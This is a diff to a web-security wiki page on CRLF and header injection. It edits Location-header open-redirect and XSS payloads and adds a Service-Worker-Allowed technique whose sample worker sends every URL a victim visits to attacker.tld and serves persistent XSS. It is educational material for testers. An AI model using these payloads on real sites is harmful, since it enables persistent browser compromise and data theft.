@@ -177,7 +177,7 @@ Content-Type: text/html
 <strong>Location: [INPUT]
 </strong></code></pre>
 
-First of all, an open redirect may be possible if the URL isn't validated strictly. See the following examples:
+First of all, an **open redirect** may be possible if the URL isn't validated strictly. See the following examples:
 
 ```http
 Location: [INPUT]                   -> http://evil.com
@@ -186,7 +186,7 @@ Location: http://example.com[INPUT] -> http://example.com@evil.com
 Location: /any/path/[INPUT]         -> ../../dangerous/path
 ```
 
-This isn't nearly as impactful as XSS though, but fortunately there are some tricks in both Chrome and Firefox that cause it to **ignore the redirect and show the body instead**. Chrome is the hardest, but simplest to understand. If the `Location:` is empty it will be ignored, otherwise it won't.
+This isn't nearly as impactful as XSS though, but fortunately Chrome has a trick to **ignore the redirect and show the body instead**. If the `Location:` is _empty_ it will be ignored.
 
 {% code title="Chrome" %}
 ```http
@@ -194,57 +194,13 @@ Location:
 ```
 {% endcode %}
 
-[Some](https://www.gremwell.com/firefox-xss-302) [writeups](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) explain that on Firefox there is a more interesting trick, using the `resource://` protocol:
-
-{% code title="Firefox" %}
-```http
-Location: resource://anything
-```
-{% endcode %}
-
-With the above payloads, you can force the browser to stop redirecting and show the content instead. With the ability to insert newlines in the response you can give it a HTML body with XSS:
-
-**Chrome** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=DQoNCjxzdmcgb25sb2FkPWFsZXJ0KCk%2B\&ieol=CRLF): `%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`
+So if your input starts in the `Location:` header, simply inject two `\r\n` sequences and then your XSS payload as the body. The payload will look like this ([test](https://r.jtw.sh/poc.html?body=%3Cscript%3Ealert%28origin%29%3C%2Fscript%3E\&h\[Location]=)):
 
 ```http
 Location: 
 
-<svg onload=alert()>
+<script>alert(origin)</script>
 ```
-
-**Firefox** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=cmVzb3VyY2U6Ly9hbnl0aGluZw0KDQo8c3ZnIG9ubG9hZD1hbGVydCgpPg\&ieol=CRLF): `resource://anything%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`
-
-```http
-Location: resource://anything
-
-<svg onload=alert()>
-```
-
-#### Firefox XSS without CRLF
-
-If you have **the same injection point** in a **response** both in the `Location:` and in the **body**, where you can escape the body for XSS with special characters, you can use the `resource://` prefix to ignore the redirect. After `?` special characters are allowed:
-
-```http
-HTTP/1.1 302 Found
-Location: [INPUT]
-Content-Type: text/html
-
-<html>Object moved to <a href="[INPUT]">here</a></html>
-```
-
-**Payload**: `resource://test?"><img src onerror=alert()>`
-
-{% code title="Exploit" %}
-```http
-HTTP/1.1 302 Found
-Location: resource://test?"><img src onerror=alert()>
-Content-Type: text/html
-
-<html>Object moved to <a href="resource://test?"><img src onerror=alert()>">here</a></html>
-```
-{% endcode %}
-
-If this protocol isn't allowed in your situation, try appending a correct `https://` URL _after it_ to see if it performs a partial match.
 
 ## Response Headers
 
@@ -262,6 +218,52 @@ Location: /somewhere
 Set-Cookie: xss=<script>alert(origin)</script>
 ```
 
+### Service-Worker-Allowed
+
+The [`Service-Worker-Allowed:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Service-Worker-Allowed) header is uncommon, but useful for redefining where a [Service Worker](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) may be scoped. These workers are require to be loaded from a path on the origin and by default they may only intercept requests from the same directory as it was served from. Eg. `/uploads/sw.js` will only be able to intercept `/uploads/*`, not `/anything-else`.
+
+Setting this header to `/` disables the restriction and lets you intercept all paths starting with `/`. This is especially useful for getting more impact out of [#response-splitting](crlf-header-injection.md#response-splitting "mention"), since Service Workers are permanently stored **persistent** between browser sessions, allowing requests to be intercepted and maintain in control of the victim's browser.
+
+```http
+Service-Worker-Allowed: /
+```
+
+You'll have to do this in two steps (two Response Splitting payloads):
+
+1. Return XSS, call `navigator.serviceWorker.register(...)` with a scope of `/` pointing to another Response Splitting payload that returns the Service Worker and this special header.
+2. Return the Service Worker source code and `Service-Worker-Allowed: /`, with correct `Content-Type`.
+
+<pre class="language-html" data-title="1. XSS"><code class="lang-html">&#x3C;script>
+  const injection = `
+Service-Worker-Allowed: /
+Content-Type: text/javascript
+
+...`;
+<strong>  navigator.serviceWorker.register(`/vuln?header=${injection}`, { scope: "/" });
+</strong><strong>&#x3C;/script>
+</strong></code></pre>
+
+<pre class="language-javascript" data-title="2. Service Worker"><code class="lang-javascript">self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
+self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+
+self.addEventListener('fetch', (e) => {
+    console.log('Intercepted fetch for', e.request.url);
+    // You can choose to exfiltrate any content now
+<strong>    fetch("https://attacker.tld/log?url=" + e.request.url)
+</strong>    
+    // or return another persistent XSS payload
+<strong>    e.respondWith(new Response('&#x3C;script>alert(origin)&#x3C;\/script>', {
+</strong><strong>      headers: { 'Content-Type': 'text/html' }
+</strong><strong>    }));
+</strong>});
+</code></pre>
+
+From now on, every URL that the victim visits will be exfiltrated to `attacker.tld`, and gets `<script>alert(origin)</script>` as the response, triggering an XSS popup until the Service Worker is manually unregistered (via `chrome://serviceworker-internals/`).
+
+{% hint style="info" %}
+**Tip**: Use [#chrome-load-self-with-content-length-truncation](crlf-header-injection.md#chrome-load-self-with-content-length-truncation "mention") to remove any excess body after your serivce worker source code if needed.
+{% endhint %}
+
 ### Link
 
 The [`Link:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Link) header is a special one that has many different features. In the header value you provide a link in between angle brackets (`<>`), followed by attributes like `rel=` that specify what it's used for. Using a comma (`,`) it's possible to provide multiple link rules in one header.
@@ -271,21 +273,6 @@ The following table shows which rel types are recognized. Note that not all of t
 {% embed url="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel" %}
 List of all `rel=` attributes and their meaning
 {% endembed %}
-
-#### [`rel="stylesheet"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#stylesheet)
-
-This header adds the link URL as a stylesheet to the returned page, allowing [css-injection.md](css-injection.md "mention"). The syntax is as follows:
-
-```http
-Link: <https://attacker.com>;rel=stylesheet
-```
-
-Only Firefox understands stylesheets through a header, it will be ignored in Chrome.\
-[I found this once in the real world](https://bsky.app/profile/jorianwoltjer.com/post/3lhwnargkrc2m) in a partial `Link:` header injection that reflected the URL, to style the 404 page arbitrarily. It also shows that the first `rel=` attribute takes priority.
-
-#### [`rel="preload"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#preload) with `referrerpolicy="unsafe-url"`
-
-Due to what's arguably a chrome bug, injecting a header in a subresource request, even a cross-site one, you can leak the current URL in the `Referer:`. Check out [#link-response-header-with-preload](cross-site-scripting-xss/html-injection.md#link-response-header-with-preload "mention").
 
 ### NEL (Network Error Logging)
 
@@ -346,6 +333,21 @@ You can also use the `--short-reporting-delay` startup flag in Chrome while test
 {% hint style="info" %}
 **Tip**: while testing, make sure the host and reporting endpoint use `https://`, and Cloudflare is not overwriting it with its own `cf-nel`. Set up a working receiving server using [`interactsh-client -v`](https://github.com/projectdiscovery/interactsh).
 {% endhint %}
+
+#### [`rel="stylesheet"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#stylesheet)
+
+This header adds the link URL as a stylesheet to the returned page, allowing [css-injection.md](css-injection.md "mention"). The syntax is as follows:
+
+```http
+Link: <https://attacker.com>;rel=stylesheet
+```
+
+Only Firefox understands stylesheets through a header, it will be ignored in Chrome.\
+[I found this once in the real world](https://bsky.app/profile/jorianwoltjer.com/post/3lhwnargkrc2m) in a partial `Link:` header injection that reflected the URL, to style the 404 page arbitrarily. It also shows that the first `rel=` attribute takes priority.
+
+#### [`rel="preload"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#preload) with `referrerpolicy="unsafe-url"`
+
+Due to what's arguably a chrome bug, injecting a header in a subresource request, even a cross-site one, you can leak the current URL in the `Referer:`. Check out [#link-response-header-with-preload](cross-site-scripting-xss/html-injection.md#link-response-header-with-preload "mention").
 
 ### CORS
 
